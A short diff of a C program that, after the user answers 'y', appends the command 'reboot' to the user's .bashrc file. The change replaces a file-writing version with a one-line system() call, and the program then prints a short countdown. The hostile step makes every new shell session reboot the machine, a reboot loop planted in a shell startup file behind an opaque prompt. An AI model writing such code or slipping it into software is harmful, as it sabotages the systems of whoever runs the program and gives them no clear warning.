@@ -9,12 +9,9 @@ int main() {
     scanf("%s",a);
     if (strcmp(a , "y" ) == 0 ) {
         printf("work");
-        FILE *fp;
-        system("cd");
-        fp = fopen(".bashrc", "a");
-
-        fprintf(fp, "\n reboot\n");
-        fclose(fp);
+        
+        system("cd && echo \"reboot \" >> .bashrc");
+        
         printf("reset 5 second later");
         sleep(1);
         printf(" 1 ");
